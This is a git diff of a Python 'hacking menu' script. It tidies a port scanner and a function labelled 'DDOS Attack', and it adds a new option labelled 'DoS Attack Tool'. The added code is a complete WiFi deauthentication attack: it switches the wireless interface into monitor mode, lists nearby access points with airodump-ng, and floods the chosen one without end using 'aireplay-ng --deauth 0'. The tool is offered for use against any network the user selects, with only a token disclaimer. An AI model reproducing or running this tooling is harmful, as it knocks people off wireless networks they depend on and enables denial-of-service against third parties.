@@ -18,11 +18,11 @@ print("Developed by iamgeo1")
 opt0 = -1
 opt1 = -1
 opt2 = -1
+opt4 = -1
 
 # Define your programs
 def program0():
     # Port Scanner Program
-
     print("Made by iamgeo1")
 
     # Create a banner
@@ -72,7 +72,6 @@ def program0():
 
 def program1():
     # DDOS Attack Program
-
     def display_banner():
         banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
         banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
@@ -125,31 +124,24 @@ def program1():
 
 def program2():
     # Port Scanner with Colorama
-
-    # Define ASCII art
-    ascii_art =(""" ____   ___  ____ _____   ____   ____    _    _   _ _   
+    ascii_art = """ ____   ___  ____ _____   ____   ____    _    _   _ _   
 |  _ \ / _ \|  _ \_   _| / ___| / ___|  / \  | \ | | \ | | ____|  _ \ 
 | |_) | | | | |_) || |   \___ \| |     / _ \ |  \| |  \| |  _| | |_) |
 |  __/| |_| |  _ < | |    ___) | |___ / ___ \| |\  | |\  | |___|  _ < 
 |_|    \___/|_| \_\|_|   |____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\
 
-""")
-
-    # Print ASCII art in different colors
+"""
     print(Fore.CYAN + ascii_art + Style.RESET_ALL)  # Cyan text
 
     print(Fore.BLUE + "Made by iamgeo1")
     print(Fore.BLUE + "Only use this for security reasons")
     print(Fore.BLUE + "For any advice, add @geo1ge on snapchat.com")
 
-    # Input the target IP address
     target_ip = input(Fore.RED + "Target IP:")
-    # Input port range
     start_port = int(input(Fore.YELLOW + "Start Port:"))
     end_port = int(input(Fore.YELLOW + "End Port:"))
 
     def port_scanner(target_ip, start_port, end_port):
-
         for port in range(start_port, end_port + 1):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(4)
@@ -162,32 +154,137 @@ def program2():
 
     port_scanner(target_ip, start_port, end_port)
 
-def programchoices():
-    validity = False
-    while not validity:
-        print("")
-        print("[0] - Port Scanner")
-        print("[1] - DDOS Attack")
-        print("[2] - Advanced Port Scanner with Colorama")
-        print("")
+def program4():
+    # DoS Attack Tool (option 4)
+    import subprocess  
+    import re
+    import csv
+    import os
+    import time
+    import shutil
+    from datetime import datetime
 
-        optchoice = int(input("Choose an option: "))
+    active_wireless_networks = []
 
-        if optchoice == 0:
-            validity = True
+    def check_for_essid(essid, lst):
+        check_status = True
+        if len(lst) == 0:
+            return check_status
+        for item in lst:
+            if essid in item["ESSID"]:
+                check_status = False
+        return check_status
+
+    print(r""" ___    _    __  __  ____ _____
+|_ _|  / \  |  \/  |/ ___| ____/ _ \/ |
+ | |  / _ \ | |\/| | |  _|  _|| | | | |
+ | | / ___ \| |  | | |_| | |__| |_| | |
+|___/_/   \_\_|  |_|\____|_____\___/|_|""")
+
+    print("\n****************************************************************")
+    print("\n* Copyright by iamgeo1                                          *")
+    print("\n*****************************************************************")
+
+    if not 'SUDO_UID' in os.environ.keys():
+        print("Try running this program with sudo.")
+        exit()
+
+    for file_name in os.listdir():
+        if ".csv" in file_name:
+            print("There shouldn't be any .csv files in your directory.")
+            directory = os.getcwd()
+            try:
+                os.mkdir(directory + "/backup/")
+            except:
+                print("Backup folder exists.")
+            timestamp = datetime.now()
+            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+
+    wlan_pattern = re.compile("^wlan[0-9]+")
+    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+    if len(check_wifi_result) == 0:
+        print("Please connect a WiFi controller and try again.")
+        exit()
+
+    print("The following WiFi interfaces are available:")
+    for index, item in enumerate(check_wifi_result):
+        print(f"{index} - {item}")
+
+    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
+    try:
+        wifi_interface_choice = check_wifi_result[int(wifi_interface_choice)]
+    except:
+        print("Not a valid option, please try again.")
+        exit()
+
+    subprocess.run(["ip", "link", "set", wifi_interface_choice, "down"])
+    subprocess.run(["iwconfig", wifi_interface_choice, "mode", "monitor"])
+    subprocess.run(["ip", "link", "set", wifi_interface_choice, "up"])
+
+    discover_access_points = subprocess.Popen(["airodump-ng", wifi_interface_choice, "--write", "cap", "--output-format", "csv"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    try:
+        while True:
+            subprocess.call("clear", shell=True)
+            for file_name in os.listdir():
+                if ".csv" in file_name:
+                    with open(file_name, newline="") as csvfile:
+                        csvreader = csv.DictReader(csvfile)
+                        for row in csvreader:
+                            if row["BSSID"] == "BSSID":
+                                pass
+                            elif check_for_essid(row["ESSID"], active_wireless_networks):
+                                active_wireless_networks.append(row)
+            print("Scanning. Press Ctrl+C when you want to select which access point to attack.\n")
+            print("No |\tBSSID              |\tChannel|\tESSID")
+            print("___|\t___________________|\t_______|\t__________________")
+            for index, item in enumerate(active_wireless_networks):
+                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nReady to make choice.")
+
+    for index, item in enumerate(active_wireless_networks):
+        print(f"{index} - {item}")
+
+    ap_choice = input("Please select a choice from the list: ")
+    try:
+        ap_choice = active_wireless_networks[int(ap_choice)]
+    except:
+        print("Not a valid option, please try again.")
+        exit()
+
+    subprocess.run(["airmon-ng", "start", wifi_interface_choice, ap_choice["channel"].strip()])
+
+    print("Launching deauthentication attack...")
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", ap_choice["BSSID"], wifi_interface_choice])
+
+# Main menu
+def main_menu():
+    while True:
+        print("\n--- Main Menu ---")
+        print("0 - Port Scanner")
+        print("1 - DDOS Attack")
+        print("2 - Port Scanner (Colorama)")
+        print("4 - DoS Attack Tool")
+        print("5 - Exit")
+
+        choice = input("Enter your choice: ")
+
+        if choice == "0":
             program0()
-            break
-        elif optchoice == 1:
-            validity = True
+        elif choice == "1":
             program1()
-            break
-        elif optchoice == 2:
-            validity = True
-            program2()   
+        elif choice == "2":
+            program2()
+        elif choice == "4":
+            program4()
+        elif choice == "5":
+            print("Exiting the program.")
             break
         else:
-            print("Choose a valid option!")
-            optchoice = -1
+            print("Invalid choice. Please try again.")
 
-# Start the program
-programchoices()
+if __name__ == "__main__":
+    main_menu()
+
